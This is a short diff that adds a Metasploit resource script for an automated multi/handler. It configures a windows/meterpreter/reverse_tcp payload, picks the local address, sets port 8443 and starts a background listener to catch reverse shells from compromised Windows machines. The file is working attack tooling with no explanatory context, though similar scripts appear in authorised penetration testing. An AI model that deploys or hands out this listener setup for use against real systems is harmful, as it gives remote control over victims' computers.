@@ -1,0 +1,16 @@
+# RC script:  auto-multi/handler
+
+use multi/handler
+setg PAYLOAD windows/meterpreter/reverse_tcp
+setg DisablePayloadHandler true
+
+<ruby>
+	run_single("set LHOST #{Rex::Socket.source_address("5.5.5.5")}")
+</ruby>
+
+# Or resource chain here
+set LPORT 8443
+set ExitOnSession false
+exploit -j -z
+
+
